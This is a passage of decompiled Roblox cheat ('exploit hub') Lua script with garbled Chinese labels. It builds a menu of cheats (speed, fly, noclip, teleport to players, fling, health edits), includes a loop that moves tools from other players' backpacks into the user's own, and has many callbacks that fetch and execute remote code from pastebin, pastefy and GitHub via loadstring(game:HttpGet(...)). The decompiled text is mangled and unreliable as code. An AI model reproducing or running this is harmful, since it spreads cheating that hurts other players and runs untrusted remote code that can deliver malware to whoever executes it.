                                                :IsA("Tool") then
                                                LocalPlayer20 = game.Players.LocalPlayer.Backpack
                                                table.unpack(Pack26, 2, Pack26.Element204).Parent = LocalPlayer20
                                            end
                                            Pack26 = table.pack(Element229(Element230, Element231))
                                            Unpacked48 = table.unpack(Pack26, 1, Pack26.Element204)
                                            if Unpacked48 ~= nil then
                                                Element231 = Unpacked48
                                                continue
                                            end
                                            break
                                        end
                                    end
                                    task:wait(Unpacked48, table.unpack(Pack26, 1, Pack26.Element204))
                                    Pack26 = table.pack(GetBackpackEnabled(Element227, Element228))
                                    Unpacked47 = table.unpack(Pack26, 1, Pack26.Element204)
                                    if Unpacked47 == nil then
                                        Element228 = Unpacked47
                                        __cont14 = true
                                        break
                                    else
                                        Element228 = Unpacked47
                                    end
                                end
                                if __cont14 then
                                    break
                                end
                                Element228 = Unpacked47
                                task:wait(Unpacked47, table.unpack(Pack26, 1, Pack26.Element204))
                                continue
                            end
                        end
                        break
                    end
                    if __cont14 then
                        __cont14 = false
                        continue
                    end
                    break
                end
            else
                Element228 = Unpacked47
                local __brk3 = false
                local __cont4 = false
                while true do
                    Backpack = table.unpack(Pack26, 2, Pack26.Element204):FindFirstChild("Backpack")
                    if not Backpack then
                        task.wait(table.unpack(Pack26, 5, Pack26.Element204))
                        while true do
                            Pack26 = table.pack(ipairs(Element227, Element228))
                            Unpacked47 = ipairs(Element227)
                            if Unpacked47 == nil then
                                Element228 = Unpacked47
                                Element227 = task
                                GetBackpackEnabled = task.wait
                                GetBackpackEnabled(task, Unpacked47, table.unpack(Pack26, 1, Pack26.Element204))
                                while true do
                                    Element227 = getgenv(select(3, ...))
                                    GetBackpackEnabled = Element227.GetBackpackEnabled
                                    if GetBackpackEnabled then
                                        game.Players:GetChildren()
                                        GetBackpackEnabled = ipairs(Element227)
                                        Element228 = 0
                                        Pack26 = table.pack(GetBackpackEnabled(Element227, 0))
                                        Unpacked47 = table.unpack(Pack26, 1, Pack26.Element204)
                                        if Unpacked47 == nil then
                                            Element228 = Unpacked47
                                            Element227 = task
                                            GetBackpackEnabled = task.wait
                                            GetBackpackEnabled(task, Unpacked47, table.unpack(Pack26, 1, Pack26.Element204))
                                            continue
                                        else
                                            break
                                        end
                                    end
                                    __brk3 = true
                                    break
                                end
                                if __brk3 then
                                    break
                                end
                                Element228 = Unpacked47
                                __cont4 = true
                                break
                            else
                                Element228 = Unpacked47
                                Backpack = Element227:FindFirstChild("Backpack")
                                if Backpack then
                                    break
                                else
                                    task.wait(table.unpack(Pack26, 5, Pack26.Element204))
                                end
                            end
                        end
                        if __brk3 then
                            break
                        end
                        if __cont4 then
                            __cont4 = false
                            continue
                        end
                    end
                    Backpack:GetChildren()
                    Element229 = ipairs(Element230)
                    Pack26 = table.pack(Element229(Element230, 0))
                    Unpacked48 = table.unpack(Pack26, 1, Pack26.Element204)
                    if not (Unpacked48 == nil) then
                        Element231 = Unpacked48
                        while true do
                            if table.unpack(Pack26, 2, Pack26.Element204):IsA("Tool") then
                                LocalPlayer20 = game.Players.LocalPlayer.Backpack
                                table.unpack(Pack26, 2, Pack26.Element204).Parent = LocalPlayer20
                            end
                            Pack26 = table.pack(Element229(Element230, Element231))
                            Unpacked48 = table.unpack(Pack26, 1, Pack26.Element204)
                            if Unpacked48 ~= nil then
                                Element231 = Unpacked48
                                continue
                            end
                            break
                        end
                    end
                    task:wait(Unpacked48, table.unpack(Pack26, 1, Pack26.Element204))
                    Pack26 = table.pack(GetBackpackEnabled(Element227, Element228))
                    Unpacked47 = table.unpack(Pack26, 1, Pack26.Element204)
                    if Unpacked47 == nil then
                        Element228 = Unpacked47
                        while true do
                            task:wait(Element228, table.unpack(Pack26, 1, Pack26.Element204))
                            Element227 = getgenv(select(3, ...))
                            GetBackpackEnabled = Element227.GetBackpackEnabled
                            if GetBackpackEnabled then
                                game.Players:GetChildren()
                                GetBackpackEnabled = ipairs(Element227)
                                Pack26 = table.pack(GetBackpackEnabled(Element227, 0))
                                Unpacked47 = table.unpack(Pack26, 1, Pack26.Element204)
                                if Unpacked47 == nil then
                                    Element228 = Unpacked47
                                    continue
                                else
                                    break
                                end
                            end
                            __brk3 = true
                            break
                        end
                        if __brk3 then
                            break
                        end
                    end
                    Element228 = Unpacked47
                end
            end
            return
        else
            return GetBackpackEnabled, Element227
        end
    end
    x19.GetBackpackEnabled = Request68
    if Request68 then
        task.spawn(backgroundTask)
        Element31:Notify({
        Title = "å·²å¼å¯",
        Content = "è·åææç©å®¶èå",
        Duration = 3,
        })
    else
        Element31:Notify({
        Title = "å·²å³é­",
        Content = "è·åææç©å®¶èå",
        Duration = 3,
        })
    end
    return Request68
end

local function callback14()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float"))
end

local function callback15()
    loadstring(game:HttpGet("https://pastebin.com/raw/G2zb992X", true))
end

local function callback16()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))
end

local function callback17()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua"))
end

local function callback18()
    loadstring(game:HttpGet("https://pastefy.app/r4LHK4p0/raw"))
end

local function callback19()
    loadstring(game:HttpGet("https://pastefy.app/8HB71Lbj/raw"))
end

local function callback20()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))
end

local function callback21()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkrillexMe/SkrillexLoader/main/SkrillexLoadMain"))
end

local function callback22()
    loadstring(game:HttpGet("https://pastefy.app/xV1T3PAi/raw"))
end

local function callback23()
    loadstring(game:HttpGet("https://pastefy.app/lCEPuiQO/raw"))
end

local function callback24()
    loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))
end

local function callback25()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))
end

local function callback26()
    loadstring(game:HttpGet("https://pastebin.com/raw/acUSx6XU"))
end

local function callback27()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Calculator"))
end

local function callback28()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BS58dL/BS/refs/heads/main/è§£éææååå¨ç».txt"))
end

local function callback29()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/main/%E7%94%A8%E6%88%B7%E5%90%8D.txt"))
end

local function callback30()
    loadstring(game:HttpGet("https://pastefy.app/UqDElOpO/raw"))
end

Element31 = task.spawn
Result = runProtected
Element31(runProtected)
Element31 = loadstring
Result = game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/qwer114514/refs/heads/main/mmw.lua")
Element31 = Element31(Result)(select(2, ...))
Item = "rbxassetid://109228695009148"
Result = {
[1] = "rbxassetid://104348365371258",
[2] = "rbxassetid://132372937787351",
[3] = "rbxassetid://73573809374499",
[4] = "rbxassetid://109228695009148",
}
local Element232 = getValue2(select(5, ...))
Item = Element232
print("æ¬æ¬¡èæ¯:", Element232)
local Element233 = {
Title = "æ¬¢è¿ä½¿ç¨æå¶ä½çèæ¬çæ¬\n\nå¶ä½èï¼ä¾æ§å¹æ ¹å¤´\nå®å¨åè´¹ï¼ç¦æ­¢ååð¡",
Icon = "rbxassetid://71024334944141",
Content = "å¸®å©èï¼å®æäºº",
}
local Element234 = {
Title = "åæ¶",
Icon = "eye",
Callback = callback,
Variant = "Secondary",
}
SetCore = Element234
local Element235 = {}
Sendnotification = Element235
Element235.Title = "ç»§ç»­"
Element235.Icon = "arrow-right"
Element235.Callback = CallbackHandler
Primary = "Primary"
Element235.Variant = "Primary"
Startergui = Element235
Element233.Buttons = {[1] = Element234, [2] = Element235}
Item = Element31
Element31:Popup(Element233)
wait(select(2, ...))
while true do
    wait(select(2, ...))
    continue
end

Item = game
local Players = game:GetService("Players")
Item = game:GetService("VirtualUser")
SetCore = Routine
Players.LocalPlayer.Idled:Connect(Routine)
local Sound = Instance.new("Sound")
Sound.SoundId = "rbxassetid://114945163345022"
Sound.Parent = game.Workspace
SetCore = Sound
Sound:Play()
Startergui = "StarterGui"
SetCore = game
local StarterGui = game:GetService("StarterGui")
Sendnotification = "SendNotification"
local Element236 = {}
Primary = Element236
Element236.Title = "å¶ä½èæ¬(çª)"
Element236.Text = "å·²èªå¨å¼å¯åææº"
Element236.Icon = "rbxassetid://71024334944141"
Entry = 1.8
Element236.Duration = 1.8
Startergui = StarterGui
SetCore = StarterGui.SetCore
SetCore(StarterGui, "SendNotification", Element236)
SetCore = task.wait
Startergui = 1.8
SetCore(1.8)
Sendnotification = "SendNotification"
local Element237 = {}
Primary = Element237
Element237.Title = "å¶ä½èæ¬(çª)"
Element237.Text = "æç»­ä¼æ´æ°çªèæ¬åçªèæ¬ä¸­å¿"
Element237.Icon = "rbxassetid://71024334944141"
Entry = 1.8
Element237.Duration = 1.8
Startergui = StarterGui
SetCore = StarterGui.SetCore
SetCore(StarterGui, "SendNotification", Element237)
SetCore = task.wait
Startergui = 1.8
SetCore(1.8)
local Element238 = {}
Sendnotification = Element238
Element238.Title = "å¶ä½èæ¬(çª)"
Element238.Icon = "crown"
Element238.Author = "ä¾æ§å¹æ ¹å¤´"
Entry = 580
Sendnotification.Size = UDim2.fromOffset(580, 420)
Sendnotification.Resizable = true
Sendnotification.ScrollBarEnabled = true
Sendnotification.Folder = "windui"
Sendnotification.Background = Element232
Sendnotification.BackgroundImageTransparency = 1
Sendnotification.Transparent = true
Sendnotification.SideBarWidth = 210
Sendnotification.HideSearchBar = false
local Instance24 = {}
Entry = Instance24
Instance24.Enabled = true
Instance24.Anonymous = false
Primary = Instance24
Sendnotification.User = Instance24
Startergui = Element31
SetCore = Element31:CreateWindow(Sendnotification)
local Element239 = {}
Primary = Element239
Element239.Title = "å¶ä½ç"
Element239.Radius = 5
Entry = Color3.fromHex("#00FF87")
Primary.Color = Entry
Sendnotification = SetCore
Startergui = SetCore.Tag
Startergui(SetCore, Primary)
local Element240 = {}
Primary = Element240
Element240.Title = "å¿å®¢åæ­¢"
Element240.Radius = 6
Entry = Color3.fromHex("#FFD700")
Primary[1] = Entry
Sendnotification = SetCore
Startergui = SetCore.Tag
Startergui(SetCore, Primary)
Primary = Enum.KeyCode.F
Entry = true
Sendnotification = SetCore
Startergui = SetCore.SetToggleKey
Startergui(SetCore, Primary, true)
Startergui = ColorSequence.new
Sendnotification = {}
Primary = ColorSequenceKeypoint.new
Entry = 0
SpeedTab = "00FF87"
Primary = Primary(0, Color3.fromHex("00FF87"))
Entry = ColorSequenceKeypoint.new
SpeedTab2 = "60EFFF"
SpeedTab = Color3.fromHex("60EFFF")
Entry = Entry(0.25, SpeedTab)
local Element241 = ColorSequenceKeypoint.Element241
SpeedTab = 0.55
Ffffff = "FFFFFF"
SpeedTab2 = Color3.fromHex("FFFFFF")
Element241 = Element241(0.55, SpeedTab2)
SpeedTab = ColorSequenceKeypoint.Element241
SpeedTab2 = 0.75
Ffffff = Color3.fromHex("60EFFF")
SpeedTab = SpeedTab(0.75, Ffffff)
SpeedTab2 = ColorSequenceKeypoint.Element241
Ffffff = 1
Runservice4 = "00FF87"
SpeedTab2 = SpeedTab2(1, Color3.fromHex("00FF87"))
Sendnotification[1] = Primary
Sendnotification[2] = Entry
Sendnotification[3] = Element241
Sendnotification[4] = SpeedTab
Sendnotification[5] = SpeedTab2
Startergui = Startergui(Sendnotification)
Sendnotification = nil
Primary = createFlowBorder
Entry = Worker
SpeedTab = Runner
task.spawn(Runner)
SpeedTab = Executor
task.spawn(Executor)
SpeedTab = {}
local Element242 = {Title = "ä¿¡æ¯"}
Runservice4 = "rbxassetid://71024334944141"
Element242.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element242)
SpeedTab.informationTab = SpeedTab2
local Element243 = {Title = "ç©å®¶"}
Runservice4 = "rbxassetid://71024334944141"
Element243.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element243)
SpeedTab.ActionTab = SpeedTab2
local Element244 = {Title = "éç¨"}
Runservice4 = "rbxassetid://71024334944141"
Element244.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element244)
SpeedTab.SpeedTab = SpeedTab2
local Element245 = {Title = "éç¨2"}
Runservice4 = "rbxassetid://71024334944141"
Element245.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element245)
SpeedTab.yiTab = SpeedTab2
local Element246 = {Title = "FE"}
Runservice4 = "rbxassetid://71024334944141"
Element246.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element246)
SpeedTab.FETab = SpeedTab2
local Element247 = {Title = "ç»è´¨"}
Runservice4 = "rbxassetid://71024334944141"
Element247.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element247)
SpeedTab.PicturequalityTab = SpeedTab2
local Element248 = {Title = "ç©é£ä¸ä¼ é"}
Runservice4 = "rbxassetid://71024334944141"
Element248.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element248)
SpeedTab.flingTab = SpeedTab2
local Element249 = {Title = "æ³¨å¥å¨"}
Runservice4 = "rbxassetid://71024334944141"
Element249.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element249)
SpeedTab.ExecuteTab = SpeedTab2
local Element250 = {Title = "å¶ä»èæ¬"}
Runservice4 = "rbxassetid://71024334944141"
Element250.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element250)
SpeedTab.ScriptTab = SpeedTab2
local Element251 = {Title = "æå¡å¨èæ¬"}
Runservice4 = "rbxassetid://71024334944141"
Element251.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element251)
SpeedTab.serverTab = SpeedTab2
local Element252 = {Title = "ä¼ªè£"}
Runservice4 = "rbxassetid://71024334944141"
Element252.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element252)
SpeedTab.DisguiseTab = SpeedTab2
local Element253 = {Title = "UIè®¾ç½®"}
Runservice4 = "rbxassetid://71024334944141"
Element253.Icon = "rbxassetid://71024334944141"
Ffffff = SetCore
SpeedTab2 = SetCore:Tab(Element253)
SpeedTab.UITab = SpeedTab2
Element241 = SpeedTab
SpeedTab = SpeedTab.SpeedTab
local Element254 = {}
Ffffff = Element254
Element254.Title = "éåº¦"
Element254.Desc = "å¼å³ç§»å¨éåº¦"
Element254.Value = false
Element254.Callback = Processor
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element254)
SpeedTab = Element241.SpeedTab
local Element255 = {}
Ffffff = Element255
Element255.Title = "ç§»å¨éåº¦"
Element255.Desc = "è°èç§»å¨éåº¦"
local Element256 = {}
Runservice4 = Element256
Element256.Min = 0
Element256.Max = 350
Players = 16
Element256.Default = 16
Element255.Value = Element256
Element255.Callback = Listener
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Slider
SpeedTab(SpeedTab2, Element255)
SpeedTab = game.Players.LocalPlayer.CharacterAdded
Ffffff = waitForChild
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Connect
SpeedTab(SpeedTab2, waitForChild)
SpeedTab = Element241.SpeedTab
local Element257 = {}
Ffffff = Element257
Element257.Title = "è·³è·é«åº¦"
Element257.Desc = "å¼å³è·³è·é«åº¦"
Element257.Value = false
Element257.Callback = Resolver
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element257)
SpeedTab = Element241.SpeedTab
local Element258 = {}
Ffffff = Element258
Element258.Title = "è·³è·é«åº¦"
Element258.Desc = "è°èè·³è·é«åº¦"
local Element259 = {}
Runservice4 = Element259
Element259.Min = 50
Element259.Max = 500
Players = 50
Element259.Default = 50
Element258.Value = Element259
Element258.Callback = Dispatcher
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Slider
SpeedTab(SpeedTab2, Element258)
SpeedTab = game.Players.LocalPlayer.CharacterAdded
Ffffff = Instance4
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Connect
SpeedTab(SpeedTab2, Instance4)
SpeedTab = Element241.SpeedTab
local Element260 = {}
Ffffff = Element260
Element260.Title = "éåè®¾ç½®å¼å³"
Element260.Desc = "å¼å³éå"
Element260.Value = false
Element260.Callback = Task
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element260)
SpeedTab = Element241.SpeedTab
local Element261 = {}
Ffffff = Element261
Element261.Title = "éåè®¾ç½®"
Element261.Desc = "è¾å¥éåå¼"
Element261.Value = "196.2"
Element261.Placeholder = "è¾å¥éåå¼"
Element261.Callback = Job
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Input
SpeedTab(SpeedTab2, Element261)
SpeedTab = Element241.SpeedTab
local Element262 = {}
Ffffff = Element262
Element262.Title = "å¿«éè·æ­¥éåº¦"
Element262.Value = "50"
Element262.Placeholder = "æ°å­è¶å¤§è¶å¿«"
Element262.Callback = Job2
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Input
SpeedTab(SpeedTab2, Element262)
SpeedTab = Element241.SpeedTab
local Element263 = {}
Ffffff = Element263
Element263.Title = "å¿«éè·æ­¥"
Element263.Value = false
Element263.Callback = Job3
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element263)
Ffffff = game
SpeedTab = game:GetService("RunService").Heartbeat
Ffffff = getValue3
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Connect
SpeedTab(SpeedTab2, getValue3)
SpeedTab = Element241.SpeedTab
local Element264 = {}
Ffffff = Element264
Element264.Title = "æ éè·³è·"
Element264.Value = false
Element264.Callback = Job4
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element264)
SpeedTab = Element241.SpeedTab
local Element265 = {}
Ffffff = Element265
Element265.Title = "ç©¿å¢"
Element265.Desc = "å¼å³ç©¿å¢"
Element265.Value = false
Element265.Callback = Job6
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element265)
SpeedTab = Element241.SpeedTab
local DataStoreService = {}
Ffffff = DataStoreService
DataStoreService.Title = "å¹¿è§è®¾ç½®"
DataStoreService.Desc = "ä¿®æ¹ç¸æºè§éè§åº¦ï¼é»è®¤70ï¼"
DataStoreService.Value = "70"
DataStoreService.Placeholder = "è¾å¥å¹¿è§æ°å¼"
DataStoreService.Callback = Job8
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Input
SpeedTab(SpeedTab2, DataStoreService)
SpeedTab = Element241.SpeedTab
local DeltaTime = {}
Ffffff = DeltaTime
DeltaTime.Title = "éç½®å¹¿è§"
DeltaTime.Desc = "æ¢å¤é»è®¤å¹¿è§70"
DeltaTime.Callback = Job10
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Button
SpeedTab(SpeedTab2, DeltaTime)
SpeedTab = Element241.SpeedTab
local Element266 = {}
Ffffff = Element266
Element266.Title = "é£è¡V3"
Element266.Desc = "é£è¡UI"
Element266.Callback = Job11
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Button
SpeedTab(SpeedTab2, Element266)
SpeedTab = Element241.SpeedTab
local Element267 = {}
Ffffff = Element267
Element267.Title = "é£è¡éåº¦"
Element267.Desc = "è°èé£è¡éåº¦"
local Element268 = {}
Runservice4 = Element268
Element268.Min = 10
Element268.Max = 200
Players = 35
Element268.Default = 35
Element267.Value = Element268
Element267.Callback = Job12
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Slider
SpeedTab(SpeedTab2, Element267)
SpeedTab = Element241.SpeedTab
local Element269 = {}
Ffffff = Element269
Element269.Title = "ç»è¿é£è¡"
Element269.Value = false
Element269.Callback = Job13
SpeedTab2 = SpeedTab
SpeedTab = SpeedTab.Toggle
SpeedTab(SpeedTab2, Element269)
SpeedTab = getPlayers3
SpeedTab2 = Element241.SpeedTab
local Element270 = {Title = "éæ©è¦ä¼ éå°ç©å®¶æè¾¹"}
Element270.Values = getPlayers3(select(6, ...))
Element270.Value = nil
Element270.AllowNone = true
Runservice4 = Job15
Element270.Callback = Job15
Ffffff = SpeedTab2
SpeedTab2 = SpeedTab2.Dropdown(Ffffff, Element270)
Ffffff = Element241.SpeedTab
local Element271 = {}
Runservice4 = Element271
Element271.Title = "å·æ°ç©å®¶åè¡¨"
Players = Job16
Element271.Callback = Job16
local Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element271)
Ffffff = Element241.SpeedTab
local Element273 = {}
Runservice4 = Element273
Element273.Title = "ä¼ éå°ç®æ ç©å®¶"
Element273.Desc = "ä¼ éå°éä¸­ç©å®¶ä½ç½®"
Players = Job17
Element273.Callback = Job17
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element273)
Ffffff = Element241.SpeedTab
local Element274 = {}
Runservice4 = Element274
Element274.Title = "ä¼ éæª"
Players = Job18
Element274.Callback = Job18
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element274)
Ffffff = Element241.SpeedTab
local Element275 = {}
Runservice4 = Element275
Element275.Title = "åååç§»"
Element275.Desc = "æ­£æ°=åæ¹ï¼è´æ°=åæ¹"
local Element276 = {}
Element93 = Element276
Element276.Min =-50
Element276.Max = 50
SpeedTab3 = 0
Element276.Default = 0
Element275.Value = Element276
Players = Job19
Element275.Callback = Job19
Element272 = Ffffff
Ffffff = Ffffff.Slider
Ffffff(Element272, Element275)
Ffffff = Element241.SpeedTab
local Element277 = {}
Runservice4 = Element277
Element277.Title = "å·¦å³åç§»"
Element277.Desc = "æ­£æ°=å³è¾¹ï¼è´æ°=å·¦è¾¹"
local Element278 = {}
Element93 = Element278
Element278.Min =-50
Element278.Max = 50
SpeedTab3 = 0
Element278.Default = 0
Element277.Value = Element278
Players = Job20
Element277.Callback = Job20
Element272 = Ffffff
Ffffff = Ffffff.Slider
Ffffff(Element272, Element277)
Ffffff = Element241.SpeedTab
local Element279 = {}
Runservice4 = Element279
Element279.Title = "ä¸ä¸åç§»"
Element279.Desc = "æ­£æ°=ä¸æ¹ï¼è´æ°=ä¸æ¹"
local Element280 = {}
Element93 = Element280
Element280.Min =-50
Element280.Max = 50
SpeedTab3 = 0
Element280.Default = 0
Element279.Value = Element280
Players = Job21
Element279.Callback = Job21
Element272 = Ffffff
Ffffff = Ffffff.Slider
Ffffff(Element272, Element279)
Ffffff = Element241.SpeedTab
local Element281 = {}
Runservice4 = Element281
Element281.Title = "é²ç©é£"
Element281.Desc = "é²æ­¢æ²¡å¼æºçäººç©é£"
Element281.Value = false
Players = Job22
Element281.Callback = Job22
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element281)
Ffffff = Element241.SpeedTab
local Element282 = {}
Runservice4 = Element282
Element282.Title = "éèº«(éè¦éçåææ¢å¤)"
Element282.Value = false
Players = Job24
Element282.Callback = Job24
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element282)
Ffffff = Element241.SpeedTab
local Element283 = {}
Runservice4 = Element283
Element283.Title = "çµæåº¦"
Players = Job26
Element283.Callback = Job26
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element283)
Ffffff = Element241.SpeedTab
local Element284 = {}
Runservice4 = Element284
Element284.Title = "æ­è¿å¼å³"
Element284.Desc = "åææ®ç¾äºº"
Element284.Value = false
Players = Job27
Element284.Callback = Job27
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element284)
Ffffff = Element241.SpeedTab
local Element285 = {}
Runservice4 = Element285
Element285.Title = "æ å¤´å¼å³"
Element285.Desc = "å¤´é¨å»æ"
Element285.Value = false
Players = Job29
Element285.Callback = Job29
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element285)
Ffffff = Element241.SpeedTab
local Element286 = {}
Runservice4 = Element286
Element286.Title = "å¤è§"
Element286.Desc = "å¼å¯å¤è§æ¨¡å¼"
Element286.Value = false
Players = Job30
Element286.Callback = Job30
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element286)
Ffffff = Element241.SpeedTab
local Element287 = {}
Runservice4 = Element287
Element287.Title = "æ æ"
Element287.Desc = "å®¢æ·ç«¯"
Element287.Value = false
Players = Job31
Element287.Callback = Job31
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element287)
Ffffff = Element241.SpeedTab
local Element288 = {}
Runservice4 = Element288
Element288.Title = "èªç¶ç¾å®³æ æ"
Players = Job33
Element288.Callback = Job33
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element288)
Ffffff = Element241.SpeedTab
local Element289 = {}
Runservice4 = Element289
Element289.Title = "è¡éä¸é"
Element289.Desc = "ä¿®æ¹è¡éä¸é"
local Element290 = {}
Element93 = Element290
Element290.Min = 100
Element290.Max = 10000
SpeedTab3 = 100
Element290.Default = 100
Element289.Value = Element290
Players = Job34
Element289.Callback = Job34
Element272 = Ffffff
Ffffff = Ffffff.Slider
Ffffff(Element272, Element289)
Ffffff = Element241.SpeedTab
local Element291 = {}
Runservice4 = Element291
Element291.Title = "ä¿®æ¹è¡é"
Element291.Desc = "ä¿®æ¹å½åè¡é"
local Element292 = {}
Element93 = Element292
Element292.Min = 1
Element292.Max = 10000
SpeedTab3 = 100
Element292.Default = 100
Element291.Value = Element292
Players = Job35
Element291.Callback = Job35
Element272 = Ffffff
Ffffff = Ffffff.Slider
Ffffff(Element272, Element291)
Ffffff = Element241.SpeedTab
local Element293 = {}
Runservice4 = Element293
Element293.Title = "æè½¬å¼å³"
Element293.Desc = "è®©äººç©ä¸ç´æè½¬"
Element293.Value = false
Players = Job36
Element293.Callback = Job36
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element293)
Ffffff = Element241.SpeedTab
local Element294 = {}
Runservice4 = Element294
Element294.Title = "æè½¬éåº¦"
Element294.Desc = "æ°å­è¶å¤§è½¬å¾è¶å¿«"
Element294.Value = "10"
Element294.Placeholder = "è¾å¥æè½¬éåº¦"
Players = Job38
Element294.Callback = Job38
Element272 = Ffffff
Ffffff = Ffffff.Input
Ffffff(Element272, Element294)
Ffffff = Element241.SpeedTab
local Element295 = {}
Runservice4 = Element295
Element295.Title = "å¿«éè·åæå¡å¨äºä»¶"
Players = Job39
Element295.Callback = Job39
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element295)
Ffffff = Element241.SpeedTab
local Element296 = {}
Runservice4 = Element296
Element296.Title = "å¿èä¿®å¤å³ä¾§é»çº¿"
Players = Job40
Element296.Callback = Job40
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element296)
Ffffff = Element241.SpeedTab
local Element297 = {}
Runservice4 = Element297
Element297.Title = "å¿èå¥ç"
Players = Job41
Element297.Callback = Job41
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element297)
Ffffff = Element241.SpeedTab
local Element298 = {}
Runservice4 = Element298
Element298.Title = "ç©å®¶è¿å¥éç¥"
Element298.Desc = "æ¾ç¤ºè¿å¥ç©å®¶çå¤´ååç¨æ·å"
Element298.Value = false
Players = Job42
Element298.Callback = Job42
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element298)
Ffffff = game.Players.PlayerAdded
Runservice4 = runProtected2
Element272 = Ffffff
Ffffff = Ffffff.Connect
Ffffff(Element272, runProtected2)
Ffffff = game.Players.PlayerRemoving
Runservice4 = runProtected3
Element272 = Ffffff
Ffffff = Ffffff.Connect
Ffffff(Element272, runProtected3)
Ffffff = Element241.SpeedTab
local Element299 = {}
Runservice4 = Element299
Element299.Title = "èªç¶ç¾å®³å¸æ¹å"
Players = Job45
Element299.Callback = Job45
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element299)
Ffffff = Element241.SpeedTab
local Element300 = {}
Runservice4 = Element300
Element300.Title = "æ æå°ä¾ é£è¡r15"
Players = Job46
Element300.Callback = Job46
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element300)
Ffffff = Element241.SpeedTab
local Element301 = {}
Runservice4 = Element301
Element301.Title = "r6æ æå°ä¾ "
Players = Job47
Element301.Callback = Job47
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element301)
Ffffff = Element241.SpeedTab
local Element302 = {}
Runservice4 = Element302
Element302.Title = "r15å¯¼ç®¡"
Players = Job48
Element302.Callback = Job48
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element302)
Ffffff = Element241.SpeedTab
local Element303 = {}
Runservice4 = Element303
Element303.Title = "r6å¯¼ç®¡"
Players = Job49
Element303.Callback = Job49
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element303)
Ffffff = Element241.SpeedTab
local Element304 = {}
Runservice4 = Element304
Element304.Title = "ç§æå¨é¨"
Players = Job50
Element304.Callback = Job50
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element304)
Ffffff = Element241.SpeedTab
local Element305 = {}
Runservice4 = Element305
Element305.Title = "å¨ä½èæ¬"
Players = Job51
Element305.Callback = Job51
Element272 = Ffffff
